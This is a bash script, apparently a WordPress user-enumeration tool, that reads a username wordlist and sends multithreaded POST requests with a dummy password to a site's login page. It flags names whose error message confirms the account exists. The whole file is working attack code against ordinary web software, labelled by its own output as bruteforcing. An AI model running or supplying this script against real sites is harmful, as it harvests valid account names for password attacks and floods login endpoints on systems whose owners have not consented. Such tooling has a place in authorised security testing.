#!/bin/bash

url=$1
dic=$2
MAX_JOBS=$3

if [ $# -lt 3 ]; then
    echo "Usage: wordpressUserDiscovery.sh <url> <dictionary path> <number of threads>"
    exit 0
fi
#This function send a POST request to the wordpress server and get the status code of the grep command
#If the status code of grep is 0 a user has been found, if the status code is 1 the username isn't valid
function send_request () {
    username=$1
    response=$(curl -s -X POST -d "log=$username" -d 'pwd=random' $url -k)
    echo $response | grep 'The password you entered for the username' > /dev/null
    if [ $? -eq 0 ];then 
        printf "[+] $username found \n"
    fi
    
    
}
printf "Bruteforcing $url\n"
while IFS= read username
do
    send_request $username &  
    while [ `jobs | wc -l` -ge $MAX_JOBS ]
	do
		sleep 1
	done
done < $dic

wait
echo "Scanned finished"
